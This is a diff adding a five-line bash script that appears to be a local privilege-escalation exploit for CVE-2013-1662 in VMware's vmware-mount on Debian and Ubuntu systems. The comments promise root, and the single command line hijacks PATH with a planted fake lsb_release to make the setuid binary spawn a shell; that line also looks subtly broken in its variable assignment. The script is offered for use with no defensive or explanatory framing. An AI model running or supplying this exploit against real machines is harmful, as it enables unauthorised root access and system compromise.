@@ -1,0 +1,5 @@
+#!/bin/bash
+# this is a local priv escalation that works on debian/ubuntu derivs
+# just run the following on an affected box with vmware-mount, and you'll be root
+# see also: CVE-2013-1662
+$n=lsb_release;printf 'dash>`tty` 2>&1'>$n;chmod +x $n;PATH=.:$PATH vmware-mount
